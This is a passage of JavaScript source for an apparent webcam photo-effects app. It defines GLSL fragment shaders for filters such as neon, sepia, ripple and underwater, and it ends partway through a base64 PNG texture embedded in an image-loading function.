        "uniform float quad;uniform float fade;uniform vec4 rect;void main(){vec2 p=texCoord;float bc=0.0;if(quad==1.0){if(square==1.0){p.x*=texSize.y/texSize.x;p.x+=(texSize.x-texSize.y)/texSize.x*0.5;}if(p.x<rect.t) bc=(rect.t-p.x)*fade;else if(p.x>rect.q) bc=(p.x-rect.q)*fade;if(p.y<rect.s) bc+=(rect.s-p.y)*fade;else if(p.y>rect.p) bc+=(p.y-rect.p)*fade;p=p*1.03-0.015;}vec3 c=(texture2D(texture,p).rgb-0.5)*2.0+0.75;gl_FragColor=vec4(vec3(c.r*0.3+c.g*0.59+c.b*0.11)-bc,1.0);}",
    neon:
        "const vec3 cyan=vec3(0.35,1.05,1.4);const vec3 magenta=vec3(1.2,0,0.6);const vec3 yellow=vec3(1.2,1.2,0);void main(){vec2 p=texCoord*2.0;int mode=0;float offset=square==1.0?(texSize.x-texSize.y)/4.0/texSize.x:0.0;if(texCoord.x>0.5){p.x=(texCoord.x-0.5+offset)*2.0;mode++;}else p.x-=offset*2.0;if(texCoord.y>0.5){p.y=(texCoord.y-0.5)*2.0;mode+=2;}vec3 c=texture2D(texture,p).rgb;c=vec3((c.r*0.3+c.g*0.59+c.b*0.11)*1.3);if(mode==0) c*=yellow;else if(mode==2) c*=cyan;else if(mode==3) c*=magenta;gl_FragColor=vec4(c,1.0);}",
    nightvision:
        "uniform vec2 center;uniform float radius;void main(){float r=texture2D(texture,texCoord).r*0.9,dist=distance(texSize*texCoord,center),attn=1.0-smoothstep(radius,radius*2.0,dist);if(r>0.5) r=1.0-r;r=((r-0.5)*1.25+0.55)*attn;gl_FragColor=vec4(r*0.1,r*1.75,r*0.75,1.0);}",
    oldmoviedirt:
        "uniform float line;uniform vec3 dot0;uniform vec3 dot1;uniform vec3 dot2;const vec3 black=vec3(0.1);vec3 drawDot(vec3 c,vec3 d){vec2 p=texCoord*texSize-d.xy;return mix(black,c,smoothstep(d.z*0.5,d.z,dot(p,p)));}void main(){if(floor(texCoord.x*texSize.x)==floor(line)) gl_FragColor=vec4(black,1.0);else{vec3 c=drawDot(texture2D(texture,texCoord).rgb,dot0);c=drawDot(c,dot1);gl_FragColor=vec4(drawDot(c,dot2),1.0);}}",
    oldmovienoise:
        "uniform float flicker;uniform float jump;float rand(vec2 r){return clamp(fract(sin(dot(r,vec2(12.9898,78.233)))*437.5),0.0,1.0);}void main(){vec2 p=texCoord;p.y-=jump;if(p.y<0.0) gl_FragColor=vec4(0.1,0.1,0.1,1.0);else gl_FragColor=texture2D(texture,p)-(rand(vec2(texture2D(texture,p*0.5).g,atan(p.x,p.y)))-flicker)*0.05;}",
    oldmoviesepia:
        "uniform vec2 center;uniform float radius;uniform float width;void main(){vec3 c=texture2D(texture,texCoord).rgb;float r=c.r,g=c.g,b=c.b;c.r=min(1.0,r*0.393+g*0.769+b*0.189);c.g=min(1.0,r*0.349+g*0.686+b*0.168);c.b=min(1.0,r*0.272+g*0.534+b*0.131);float dist=distance(texSize*texCoord,center),attn=1.0-smoothstep(radius,radius+width,dist);gl_FragColor=vec4(c*attn,1.0);}",
    outline:
        "#define MAX 0.25\nuniform vec4 rect;const vec4 fg=vec4(0.0,0.0,0.0,1.0);const vec4 bg=vec4(1.0);void main(){vec2 p=texCoord;if(p.x<rect.t||p.x>rect.q||p.y<rect.s||p.y>rect.p) gl_FragColor=vec4(0.0,0.0,0.0,1.0);else{float d=texSize.y/400.0;vec4 p0=texture2D(texture,p),p1=texture2D(texture,p+vec2(d,0.0)/texSize),p2=texture2D(texture,p+vec2(0.0,d)/texSize),p3=texture2D(texture,p+vec2(d,d)/texSize),p4=texture2D(texture,p+vec2(-d,d)/texSize);float dMax=max(max(distance(p0,p1),distance(p0,p2)),max(distance(p0,p3),distance(p0,p4)));gl_FragColor=dMax>MAX?fg:bg+(fg-bg)*dMax/MAX;}}",
    overlay:
        "uniform sampler2D texture2;uniform vec4 rect;uniform float mult;uniform float offset;void main(){vec3 c,c2=texture2D(texture2,texCoord).rgb;if(texCoord.x<rect.t||texCoord.x>rect.q||texCoord.y<rect.s||texCoord.y>rect.p) c=vec3(0.7);else c=(texture2D(texture,texCoord*1.03-0.015).rgb-0.5)*mult+offset;c.r=(c.r<0.5?(2.0*c.r*c2.r):(1.0-2.0*(1.0-c.r)*(1.0-c2.r)));c.g=(c.g<0.5?(2.0*c.g*c2.g):(1.0-2.0*(1.0-c.g)*(1.0-c2.g)));c.b=(c.b<0.5?(2.0*c.b*c2.b):(1.0-2.0*(1.0-c.b)*(1.0-c2.b)));gl_FragColor=vec4(c,1.0);}",
    popart:
        "uniform sampler2D texture2;void main(){vec2 p=texCoord*2.0;float mode=0.0;float offset=square==1.0?(texSize.x-texSize.y)/4.0/texSize.x:0.0;if(texCoord.x>0.5) p.x=(texCoord.x-0.5+offset)*2.0;else{p.x-=offset*2.0;mode++;}if(texCoord.y>0.5){p.y=(texCoord.y-0.5)*2.0;mode+=2.0;}vec3 c=(texture2D(texture,p).rgb-0.5)*1.5+0.7;gl_FragColor=texture2D(texture2,vec2(c.r*0.3+c.g*0.59+c.b*0.11,mode/3.0));}",
    quadcam: "void main(){vec2 p=texCoord;if(square==1.0){p.x*=texSize.y/texSize.x;p.x+=(texSize.x-texSize.y)/texSize.x*0.5;}gl_FragColor=texture2D(texture,p);}",
    radialblur:
        "#define DIST 6.0\nuniform vec2 center;uniform float radius;uniform float blur;uniform float width;uniform vec2 delta;void main(){vec3 c=vec3(0.0);float total=0.0,percent=0.0,weight=0.0,offset=clamp(fract(sin(dot(texCoord*texSize,vec2(12.9898,78.233)))*437.5)-0.5,-0.5,0.5),dist=distance(texSize*texCoord,center),attn=smoothstep(radius,radius+width,dist)*blur;for(float t=-DIST;t<=DIST;t++){percent=(t+offset)/DIST;weight=1.0-abs(percent);c+=texture2D(texture,texCoord+delta*percent*attn).rgb*weight;total+=weight;}gl_FragColor=vec4(clamp(c/total,0.0,1.0),1.0);}",
    rainbow:
        "uniform vec2 size;uniform float offset;const vec3 c0=vec3(1.0,0.0,0.5);const vec3 c1=vec3(1.0,0.0,1.0);const vec3 c2=vec3(0.0,0.0,1.0);const vec3 c3=vec3(0.0,0.4,1.0);const vec3 c4=vec3(0.0,1.0,1.0);const vec3 c5=vec3(0.0,1.0,0.0);const vec3 c6=vec3(1.0,1.0,0.0);const vec3 c7=vec3(1.0,0.0,0.0);void main(){vec2 p=gl_FragCoord.xy/size*1.3-0.15;float n=(p.x+p.y+offset)/2.0;vec3 c;if(n<0.125) c=c0;else if(n<0.25) c=mix(c0,c1,(n-0.125)*8.0);else if(n<0.375) c=mix(c1,c2,(n-0.25)*8.0);else if(n<0.5) c=mix(c2,c3,(n-0.375)*8.0);else if(n<0.625) c=mix(c3,c4,(n-0.5)*8.0);else if(n<0.75) c=mix(c4,c5,(n-0.625)*8.0);else if(n<0.875) c=mix(c5,c6,(n-0.75)*8.0);else if(n<1.125) c=mix(c6,c7,(n-0.875)*4.0);else c=c7;gl_FragColor=vec4(c,1.0);}",
    rainbowborder:
        "uniform float radius;uniform float border;uniform float ratio;void main(){vec2 p=texCoord-0.5;float r=radius/texSize.y,b=length(max(abs(vec2(p.x*texSize.x/texSize.y,p.y)/r)-vec2(0.5*ratio,0.5)/r+border,0.0));gl_FragColor=vec4(1.0-(1.0-texture2D(texture,texCoord).rgb)*clamp(smoothstep(1.02,0.98,b),0.0,1.0),1.0);}",
    retro:
        "uniform sampler2D texture2;uniform float rotate;const vec3 offset=vec3(0.0,0.2,0.5);const vec3 fuzz=vec3(0.98,0.8,0.44);void main(){vec2 p=texCoord*1.05-0.025,bp=texCoord;if(square==1.0){bp.x*=texSize.x/texSize.y;bp.x-=(texSize.x-texSize.y)*0.5/texSize.y;}vec3 b=vec3(texture2D(texture2,rotate==1.0?bp.yx:bp).r),c=texture2D(texture,p).rgb;c.r=texture2D(texture,vec2(p.x+0.0025,p.y)).r;c=min(c*fuzz*1.3,fuzz);c+=offset*(1.0-c);gl_FragColor=vec4(c-b,1.0);}",
    ripple:
        "uniform float wavelength;uniform float amplitude;uniform vec2 center;void main(){vec2 p=texCoord*texSize;p.x+=amplitude*sin((p.x-center.x)/wavelength);p.y+=amplitude*cos((p.y-center.y)/wavelength);gl_FragColor=texture2D(texture,p/texSize*0.95+0.025);}",
    rose:
        "#define R_LU 0.3\n#define G_LU 0.59\n#define B_LU 0.11\n#define SAT 0.75\nuniform vec2 center;uniform float radius;uniform float width;uniform float fade;uniform vec4 rect;const vec3 offset=vec3(0.6,-0.1,0.0);const vec3 rose=vec3(0.82,0.94,1.0);void main(){vec2 p=texCoord*1.05-0.025;vec3 c0=texture2D(texture,p).rgb,c;c.r=((R_LU+(1.0-R_LU)*SAT)*c0.r)+((G_LU-G_LU*SAT)*c0.g)+((B_LU-B_LU*SAT)*c0.b);c.g=((R_LU-R_LU*SAT)*c0.r)+((G_LU+(1.0-G_LU)*SAT)*c0.g)+((B_LU-B_LU*SAT)*c0.b);c.b=((R_LU-R_LU*SAT)*c0.r)+((G_LU-G_LU*SAT)*c0.g)+((B_LU+(1.0-B_LU)*SAT)*c0.b);c*=rose*1.4;c+=offset*(1.0-c);float bc=0.0,dist=distance(p*texSize,center),attn=smoothstep(radius,radius+width,dist);if(texCoord.x<rect.t) bc=(rect.t-texCoord.x)*fade;else if(texCoord.x>rect.q) bc=(texCoord.x-rect.q)*fade;if(texCoord.y<rect.s) bc+=(rect.s-texCoord.y)*fade;else if(texCoord.y>rect.p) bc+=(texCoord.y-rect.p)*fade;gl_FragColor=vec4(c-attn-bc,1.0);}",
    shuffle:
        "uniform sampler2D frame1;uniform sampler2D frame2;uniform sampler2D frame3;uniform sampler2D frame4;uniform sampler2D frame5;uniform sampler2D frame6;uniform sampler2D frame7;uniform sampler2D frame8;uniform sampler2D frame9;void main(){vec2 p=texCoord;vec4 c;if(p.y<0.1) c=texture2D(texture,p);else if(p.y<0.2) c=texture2D(frame9,p);else if(p.y<0.3) c=texture2D(frame8,p);else if(p.y<0.4) c=texture2D(frame7,p);else if(p.y<0.5) c=texture2D(frame6,p);else if(p.y<0.6) c=texture2D(frame5,p);else if(p.y<0.7) c=texture2D(frame4,p);else if(p.y<0.8) c=texture2D(frame3,p);else if(p.y<0.9) c=texture2D(frame2,p);else c=texture2D(frame1,p);gl_FragColor=c;}",
    shufflesimple:
        "uniform sampler2D frame1;uniform sampler2D frame2;uniform sampler2D frame3;uniform sampler2D frame4;void main(){vec2 p=texCoord;vec4 c;if(p.y<0.2) c=texture2D(texture,p);else if(p.y<0.4) c=texture2D(frame4,p);else if(p.y<0.6) c=texture2D(frame3,p);else if(p.y<0.8) c=texture2D(frame2,p);else c=texture2D(frame1,p);gl_FragColor=c;}",
    silk:
        "#define R_LU 0.3\n#define G_LU 0.59\n#define B_LU 0.11\n#define SAT 0.2\nuniform vec2 center;uniform float radius;uniform float width;const vec3 silk=vec3(0.9137,0.9098,0.898);void main(){vec2 p=texCoord;float dist=distance(p*texSize,center),attn;if(dist<radius) attn=0.0;else if(dist>radius+width) attn=1.0;else attn=pow((dist-radius)/width,1.4);vec3 c0=texture2D(texture,p).rgb*0.6+0.4,c;c.r=((R_LU+(1.0-R_LU)*SAT)*c0.r)+((G_LU-G_LU*SAT)*c0.g)+((B_LU-B_LU*SAT)*c0.b);c.g=((R_LU-R_LU*SAT)*c0.r)+((G_LU+(1.0-G_LU)*SAT)*c0.g)+((B_LU-B_LU*SAT)*c0.b);c.b=((R_LU-R_LU*SAT)*c0.r)+((G_LU-G_LU*SAT)*c0.g)+((B_LU+(1.0-B_LU)*SAT)*c0.b);gl_FragColor=vec4(min((c+attn)*silk*1.5-0.25,silk),1.0);}",
    sketch:
        "#define N0 97.0\n#define N1 15.0\n#define N2 97.0\n#define N3 9.7\n#define N4 19.4\nvoid main(){vec2 offset=vec2(0.0);float dist=N3;vec4 m,p0,p1,p2,p3,p4,p5,p6,p7,p8;vec2 d=(texSize.x/800.0)/texSize;p0=texture2D(texture,texCoord);p1=texture2D(texture,texCoord+vec2(-dist,-dist)*d);p2=texture2D(texture,texCoord+vec2(dist,-dist)*d);p3=texture2D(texture,texCoord+vec2(dist,dist)*d);p4=texture2D(texture,texCoord+vec2(-dist,dist)*d);dist=N4;p5=texture2D(texture,texCoord+vec2(-dist,-dist)*d);p6=texture2D(texture,texCoord+vec2(dist,-dist)*d);p7=texture2D(texture,texCoord+vec2(dist,dist)*d);p8=texture2D(texture,texCoord+vec2(-dist,dist)*d);m=(p0*N2+(p1+p2+p3+p4)*N0+(p5+p6+p7+p8)*N1)/((N0+N1)*4.0+N2);p0 /= m;float lu=p0.r*0.3+p0.g*0.59+p0.b*0.11;gl_FragColor=vec4(lu,lu,lu,1.0);}",
    smoke:
        "uniform float time;float r(float d,float w,float o){return(cos(d*0.0174533)+1.0)*w+o;}void main(){vec2 p=texCoord;float t=time*0.25+1024.0,w=r(t*10.0,2.0,0.5),cw=cos(w)*0.0075,xo=r(t*0.12,2.5,5.0),yo=r(t*0.1,4.0,5.0);for(float i=1.0;i<31.0;i++){p.x+=sin(p.y*i+t*cw+i*0.03)*0.375/i+xo;p.y+=sin(p.x*i+t*w*0.00375+(i+15.0)*0.03)*0.6/i+yo;}vec3 c0=(texture2D(texture,texCoord).rgb-0.5)*1.5+0.6;c0=mix(c0,vec3(c0.r*0.3+c0.g*0.59+c0.b*0.11),0.5);vec3 c1=clamp(vec3(sin(p.x*3.0)*0.5+0.5,sin(p.y*3.0)*0.5+0.5,sin(p.x+p.y)),0.0,1.0)*0.7+0.3;gl_FragColor=vec4(1.0-(1.0-c0)*(1.0-c1),1.0);}",
    snow:
        "uniform vec2 center;uniform float radius;uniform float width;const vec3 frost=vec3(0.9,1.1,1.5);void main(){vec3 c=texture2D(texture,texCoord).rgb;float dist=distance(texSize*texCoord,center),attn=smoothstep(radius,radius+width,dist);attn=max(0.1,attn);gl_FragColor=vec4((1.0-(1.0-c)*(1.0-attn))*frost,1.0);}",
    softfocus: "uniform sampler2D texture2;void main(){vec3 c1=(texture2D(texture,texCoord).rgb-0.5)*1.2+0.5;vec3 c2=(texture2D(texture2,texCoord).rgb-0.5)*1.2+0.5;gl_FragColor=vec4(1.0-(1.0-c1)*(1.0-c2),1.0);}",
    sparkle:
        "uniform sampler2D texture2;uniform sampler2D texture3;uniform float mirror;void main(){vec2 p=texCoord;vec3 c1=(texture2D(texture,p).rgb-0.5)*1.5+0.5;vec3 c2=(texture2D(texture2,p).rgb-0.5)*1.5+0.5;if(mirror==1.0) p.x=1.0-p.x;float c3=texture2D(texture3,p).r;c1=1.0-(1.0-c1)*(1.0-c2);float r=c1.r,g=c1.g,b=c1.b;c1.r=min(1.0,r*0.3+g*0.5+b*0.2);c1.g=min(1.0,r*0.3+g*0.5+b*0.2);c1.b=min(1.0,r*0.3+g*0.375+b*0.3+0.05);gl_FragColor=vec4(c1+c3,1.0);}",
    spectrum:
        "#define FREQ 8.0\nuniform float time;void main(){vec3 c=texture2D(texture,texCoord).rgb;float t=time*2.0,r=(1.0+sin(FREQ*c.r+t*1.25))*0.5,g=(1.0+cos(FREQ*c.g+t))*0.5,b=(1.0+sin(-FREQ*c.b+t*0.8))*0.5;gl_FragColor=vec4(r,g,b,1.0);}",
    spiral:
        "uniform float spiralx;uniform float a;uniform vec2 center;uniform vec2 za;uniform vec2 start;uniform vec2 s;void main(){vec2 p=texCoord*texSize;float ix=start.x+p.x*za.x+p.y*za.y,iy=start.y+p.x*za.y-p.y*za.x;float d=log(ix*ix+iy*iy)/2.0,f=atan(iy,ix),j=(s.x*f-s.y*d)/s.x,z=exp(mod((s.x*d+s.y*f)/s.x,a))*spiralx;gl_FragColor=texture2D(texture,vec2(center.x+cos(j)*z,center.y-sin(j)*z)/texSize);}",
    spiral1: "uniform vec2 za;uniform vec2 start;void main(){float ix=start.x+gl_FragCoord.x*za.x+gl_FragCoord.y*za.y,iy=start.y+gl_FragCoord.x*za.y-gl_FragCoord.y*za.x;gl_FragColor=vec4(log(ix*ix+iy*iy)/2.0,atan(iy,ix),0.0,1.0);}",
    spiral2:
        "uniform sampler2D texture2;uniform float spiralx;uniform float a;uniform vec2 center;uniform vec2 s;void main(){vec4 k=texture2D(texture,texCoord);float j=(s.x*k.g-s.y*k.r)/s.x,z=exp(mod((s.x*k.r+s.y*k.g)/s.x,a))*spiralx;gl_FragColor=texture2D(texture2,vec2(center.x+cos(j)*z,center.y-sin(j)*z)/texSize);}",
    splitscreen:
        "uniform sampler2D texture2;void main(){vec2 p=texCoord;float offset=square==1.0?(texSize.x-texSize.y)/4.0/texSize.x:0.0;if(floor((p.x*texSize.x+1.0)/2.0)==floor(texSize.x/4.0)) gl_FragColor=vec4(0.0,0.0,0.0,1.0);else if(p.x<0.5){p.x+=0.25-offset;gl_FragColor=texture2D(texture,p);} else{p.x-=0.25-offset;gl_FragColor=texture2D(texture2,p);}}",
    spycam:
        "#define PI 3.14159265\nuniform float time;const vec3 tint=vec3(0.85,1.1,1.35);float rand(vec2 r){return clamp(fract(sin(dot(r,vec2(12.9898,78.233)))*437.5),0.0,1.0);}void main(){vec2 p=texCoord;vec3 c=texture2D(texture,p).rgb;float b=mix(sin(p.x*PI),sin(p.y*PI),0.5),noise=rand(vec2(c.g,atan(p.x,p.y))),y=(p.y*texSize.y)/2.0,tv=mix(b,mix(b/2.0,abs(sin(y))/1.5,0.5),0.5)+noise/16.0;c=vec3(c.r*0.3+c.g*0.59+c.b*0.11)*tint;gl_FragColor=vec4(((c-0.5)*4.0+1.0)*vec3(tv),1.0);}",
    stretch: "void main(){vec2 p=vec2(0.5-(0.5-texCoord.x)*sin(texCoord.y*6.28318531),texCoord.y);float dy=p.y;if(dy>0.75) p.x=1.0-texCoord.x;else if(dy<0.25) p.x=texCoord.x;if(dy>0.5) p.x=1.0-p.x;gl_FragColor=texture2D(texture,p);}",
    switch: "void main(){vec2 p=texCoord;if(p.y<=0.5) p.x=1.0-p.x;gl_FragColor=texture2D(texture,p);}",
    thermal: "uniform sampler2D texture2;void main(){vec3 c=(texture2D(texture,texCoord).rgb-0.5)*1.2+0.5;gl_FragColor=texture2D(texture2,vec2(c.r*0.3+c.g*0.59+c.b*0.11,0.0));}",
    trail:
        "uniform sampler2D texture2;void main(){vec3 c1=texture2D(texture,texCoord).rgb,c2=texture2D(texture2,texCoord).rgb,c3=1.0-step(c1-c2,vec3(0.0));float c=min(1.0,c3.r+c3.g+c3.b);gl_FragColor=vec4((step(c-0.02,vec3(0.0))+0.02)*c1+c*c2,1.0);}",
    trueblue:
        "const vec3 rgbToI=vec3(0.595716,-0.274453,-0.321263);const vec3 rgbToQ=vec3(0.211456,-0.522591,0.311135);void main(){vec3 c=(texture2D(texture,texCoord).rgb-0.5)*1.25+0.6;float hue=atan(dot(c,rgbToQ),dot(c,rgbToI));float lu=c.r*0.3+c.g*0.59+c.b*0.11;if(abs(hue)<2.7) c=vec3(lu);gl_FragColor=vec4(c,1.0);}",
    tunnel:
        "uniform vec2 center;uniform float radius;void main(){vec2 coord=texCoord*texSize,p=coord-center;float dist=length(p),scale=radius/dist;vec2 r=mat2(scale,0.0,0.0,scale)*p;if(dist<radius) r=coord;else r+=center;gl_FragColor=texture2D(texture,r/texSize);}",
    twist:
        "uniform vec2 center;uniform float radius;uniform float angle;void main(){vec2 p=texCoord*texSize-center;float dist=length(p);if(dist<radius){float percent=(radius-dist)/radius,theta=percent*percent*angle,s=sin(theta),c=cos(theta);p=vec2(p.x*c-p.y*s,p.x*s+p.y*c);}gl_FragColor=texture2D(texture,(p+center)/texSize);}",
    underwater:
        "#define PI 3.14159265\n#define WAVELENGTH 5.0\n#define AMPLITUDE 0.025\n#define SPEED 0.6\nuniform float time;const vec3 water=vec3(0.85,1.2,1.6);const vec3 grey=vec3(0.3,0.59,0.11);vec3 mod289(vec3 x){return x-floor(x*(1.0/289.0))*289.0;}vec4 mod289(vec4 x){return x-floor(x*(1.0/289.0))*289.0;}vec4 permute(vec4 x){return mod289(((x*34.0)+1.0)*x);}vec4 taylorInvSqrt(vec4 r){return 1.79284291400159-0.85373472095314*r;}vec3 fade(vec3 t){return t*t*t*(t*(t*6.0-15.0)+10.0);}float noise(vec3 P){vec3 Pi0=floor(P),Pi1=Pi0+vec3(1.0);Pi0=mod289(Pi0);Pi1=mod289(Pi1);vec3 Pf0=fract(P),Pf1=Pf0-vec3(1.0);vec4 ix=vec4(Pi0.x,Pi1.x,Pi0.x,Pi1.x),iy=vec4(Pi0.yy,Pi1.yy),iz0=Pi0.zzzz,iz1=Pi1.zzzz,ixy=permute(permute(ix)+iy),ixy0=permute(ixy+iz0),ixy1=permute(ixy+iz1),gx0=ixy0*(1.0/7.0),gy0=fract(floor(gx0)*(1.0/7.0))-0.5;gx0=fract(gx0);vec4 gz0=vec4(0.5)-abs(gx0)-abs(gy0),sz0=step(gz0,vec4(0.0));gx0-=sz0*(step(0.0,gx0)-0.5);gy0-=sz0*(step(0.0,gy0)-0.5);vec4 gx1=ixy1*(1.0/7.0),gy1=fract(floor(gx1)*(1.0/7.0))-0.5;gx1=fract(gx1);vec4 gz1=vec4(0.5)-abs(gx1)-abs(gy1),sz1=step(gz1,vec4(0.0));gx1-=sz1*(step(0.0,gx1)-0.5);gy1-=sz1*(step(0.0,gy1)-0.5);vec3 g000=vec3(gx0.x,gy0.x,gz0.x),g100=vec3(gx0.y,gy0.y,gz0.y),g010=vec3(gx0.z,gy0.z,gz0.z),g110=vec3(gx0.w,gy0.w,gz0.w),g001=vec3(gx1.x,gy1.x,gz1.x),g101=vec3(gx1.y,gy1.y,gz1.y),g011=vec3(gx1.z,gy1.z,gz1.z),g111=vec3(gx1.w,gy1.w,gz1.w);vec4 norm0=taylorInvSqrt(vec4(dot(g000,g000),dot(g010,g010),dot(g100,g100),dot(g110,g110)));g000*=norm0.x;g010*=norm0.y;g100*=norm0.z;g110*=norm0.w;vec4 norm1=taylorInvSqrt(vec4(dot(g001,g001),dot(g011,g011),dot(g101,g101),dot(g111,g111)));g001*=norm1.x;g011*=norm1.y;g101*=norm1.z;g111*=norm1.w;float n000=dot(g000,Pf0),n100=dot(g100,vec3(Pf1.x,Pf0.yz)),n010=dot(g010,vec3(Pf0.x,Pf1.y,Pf0.z)),n110=dot(g110,vec3(Pf1.xy,Pf0.z)),n001=dot(g001,vec3(Pf0.xy,Pf1.z)),n101=dot(g101,vec3(Pf1.x,Pf0.y,Pf1.z)),n011=dot(g011,vec3(Pf0.x,Pf1.yz)),n111=dot(g111,Pf1);vec3 fade_xyz=fade(Pf0);vec4 n_z=mix(vec4(n000,n100,n010,n110),vec4(n001,n101,n011,n111),fade_xyz.z);vec2 n_yz=mix(n_z.xy,n_z.zw,fade_xyz.y);return mix(n_yz.x,n_yz.y,fade_xyz.x);}void main(){vec2 n=vec2(noise(vec3(texCoord,time*SPEED)*WAVELENGTH)*PI*AMPLITUDE,noise(vec3(texCoord,(time+1.0)*SPEED)*WAVELENGTH)*PI*AMPLITUDE);gl_FragColor=vec4(texture2D(texture,texCoord*0.95+0.025+sin(n)).rgb,1.0);}",
    underwaterblue:
        "uniform vec2 center;uniform float radius;uniform float width;const vec3 water=vec3(0.85,1.2,1.6);const vec3 grey=vec3(0.3,0.59,0.11);void main(){float dist=distance(texSize*texCoord,center),attn=1.0-smoothstep(radius,radius+width,dist);gl_FragColor=vec4(dot(texture2D(texture,texCoord).rgb,grey*attn)*water,1.0);}",
    upsidedown: "void main(){vec2 p=texCoord;p.y=1.0-p.y;gl_FragColor=texture2D(texture,p);}",
    vintage:
        "uniform sampler2D texture2;uniform vec2 center;uniform float radius;uniform float width;uniform float rotate;const vec3 tint=vec3(0.56,0.4,0.4);const vec3 vintage=vec3(0.94,0.76,0.6);void main(){vec3 c=texture2D(texture,texCoord).rgb;float dist=distance(texSize*texCoord,center),attn=smoothstep(radius,radius+width,dist);c=min((vec3(c.r*0.3+c.g*0.59+c.b*0.11)+attn)*vintage*1.2,vintage);c+=tint*(1.0-c);vec3 b=texture2D(texture2,rotate==1.0?texCoord.yx:texCoord).rgb;gl_FragColor=vec4(c*b,1.0);}",
    watercolor:
        "uniform sampler2D texture2;uniform float fade;uniform vec4 rect;const vec3 g1=vec3(0.87,0.35,0.47);const vec3 g2=vec3(0.51,0.41,0.63);void main(){vec2 p=texCoord;vec3 c=(texture2D(texture,p*1.025-0.0125).rgb-0.5)*2.0+0.7;float bc=0.0;if(p.x<rect.t) bc=(rect.t-p.x)*fade;else if(p.x>rect.q) bc=(p.x-rect.q)*fade;if(p.y<rect.s) bc+=(rect.s-p.y)*fade;else if(p.y>rect.p) bc+=(p.y-rect.p)*fade;float lu=c.r*0.3+c.g*0.59+c.b*0.11+bc;if(lu<0.25) c=mix(g1,g2,p.y);else if(lu<0.75) c=mix(g2,g1,p.y)+0.25;else c=vec3(1.0);gl_FragColor=vec4(c*texture2D(texture2,p).rgb,1.0);}",
    wedge:
        "uniform vec2 center;void main(){vec2 p=texCoord*texSize-center;float w=square==1.0?center.y:center.x,u=p.x/w,v=p.y/center.y,a=atan(v,u);u=cos(a)*u*u*w;v=sin(a)*v*v*center.y;gl_FragColor=texture2D(texture,vec2(center.x+u,center.y+v)/texSize);}",
    xpro: "#define TWO_PI 6.28318531\n#define X_PRO 0.1\nvoid main(){vec3 c=texture2D(texture,texCoord*1.025-0.0125).rgb;c.r-=sin(c.r*TWO_PI)*X_PRO;c.g-=sin(c.g*TWO_PI)*X_PRO;c.b+=sin(c.b*TWO_PI)*X_PRO;gl_FragColor=vec4(c*1.2,1.0);}",
    xproborder:
        "uniform float fade;uniform vec4 rect;void main(){vec3 c=texture2D(texture,texCoord).rgb;float bc=0.0;if(texCoord.x<rect.t) bc=(rect.t-texCoord.x)*fade;else if(texCoord.x>rect.q) bc=(texCoord.x-rect.q)*fade;if(texCoord.y<rect.s) bc+=(rect.s-texCoord.y)*fade;else if(texCoord.y>rect.p) bc+=(texCoord.y-rect.p)*fade;gl_FragColor=vec4(c-clamp(bc,0.0,1.0),1.0);}",
    xray: "void main(){vec3 c=(texture2D(texture,texCoord).rgb-0.5)*1.5+0.75;c=clamp(1.0-vec3(c.r*0.3+c.g*0.59+c.b*0.11),0.0,1.0)+vec3(0.0,0.156862745,0.196078431);gl_FragColor=vec4(clamp(c,0.0,1.0),1.0);}",
    zinc:
        "#define R_LU 0.3\n#define G_LU 0.5\n#define B_LU 0.2\n#define SAT 0.2\nuniform sampler2D texture2;uniform float fade;uniform vec4 rect;const vec3 tint=vec3(0.16,0.0,0.08);const vec3 cyan=vec3(0.96,1.16,1.1);void main(){vec2 p=texCoord*1.025-0.0125;vec3 c0=(1.0-(1.0-0.5*texture2D(texture,p).rgb)*(1.0-texture2D(texture2,p).rgb));vec3 c;c.r=((R_LU+(1.0-R_LU)*SAT)*c0.r)+((G_LU-G_LU*SAT)*c0.g)+((B_LU-B_LU*SAT)*c0.b);c.g=((R_LU-R_LU*SAT)*c0.r)+((G_LU+(1.0-G_LU)*SAT)*c0.g)+((B_LU-B_LU*SAT)*c0.b);c.b=((R_LU-R_LU*SAT)*c0.r)+((G_LU-G_LU*SAT)*c0.g)+((B_LU+(1.0-B_LU)*SAT)*c0.b);c*=cyan;c+=tint*(1.0-c);float bc=0.0;if(texCoord.x<rect.t) bc=(rect.t-texCoord.x)*fade;else if(texCoord.x>rect.q) bc=(texCoord.x-rect.q)*fade;if(texCoord.y<rect.s) bc+=(rect.s-texCoord.y)*fade;else if(texCoord.y>rect.p) bc+=(texCoord.y-rect.p)*fade;gl_FragColor=vec4(clamp((c-bc),0.0,1.0),1.0);}",
};
WebcamToy.getImages = function () {
    var e = {
        bokeh: new Image(),
        bubbles: new Image(),
        hazydayssq: new Image(),
        hazydays: new Image(),
        hotpink: new Image(),
        popart: new Image(),
        popbooth: new Image(),
        cocktailsq: new Image(),
        cocktail: new Image(),
        retrosq: new Image(),
        retro: new Image(),
        snowflake: new Image(),
        sparkle: new Image(),
        thermal: new Image(),
        vintage: new Image(),
        watercolor: new Image(),
    };
    e.bokeh.src =
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAABfVBMVEXGAA7jACrLACDUACXRACXMACXSABTjAC7cABXlABXbAAvVACHRACHeACHHACXZACHRACndAC3AACjnADK1AAfjADObAAXaACbaABzWACbmADbCACHLAC3cACvfACvOABugAAnMACm4ACjXACTbACPVABvGACnfADHZADPsADXeADb/BAC7BAD4AgD2AB32ABT9ABzrACUDAAH/ABX/AAv1ACbvACrwABzsACHwACEQAAHrACquAAHcAALvACWLAAL+AAXRAAXnACrsABvvAAsGAABSAALAAAb4AArjACF4AAPmACX3AC7cAAXIAAHnACFkAALlAAHAAAGZAAH/AAI+AAL/AAMoAAHnABy3AAGjAAH/AB0EAAL2AAXTAAHcACnsADD+ACjdACXIAAX4AALiACXuABUIAALuAAXIAwD/AA3SAC7lAAW4AAXZAC3fACjeABzjABymAATuAAHkAArTAgDsAwCtAAUBAADbAwDVACrTAAqRAAXnAC3ZACpsMNppAAAarElEQVR4XuyV5a4rRxCE80QDy7xmZmYfhMschGdP9ex6tbFuLFvnSMmPlMYr2bLcX1f1tH/Q/mX9NwD+B/j5DOUANlr178IHm80mB3Dmj14OgDJVnFSPySPDOIZ4OYCsdVQ5FIc8HA9PCO8zjBzFCwFoWfckqjyfex4eeOKAwQMFoI4JoOcC5OtTcZI3rQ0GOHiQptM55BGE0nEYLwSQBT+f11rj8Timl1KrRShTcMCO7yE8EyCLX8mbDuJxMOr16JCWy+DzagWWFlHAiZQByrnwDAAtH4BH3QevfhkOh2EYdukUi7vdbR0gRJExJLTasQuXA+S6x6TNp7V49Sr8cjfZpqo8PT2Bphvu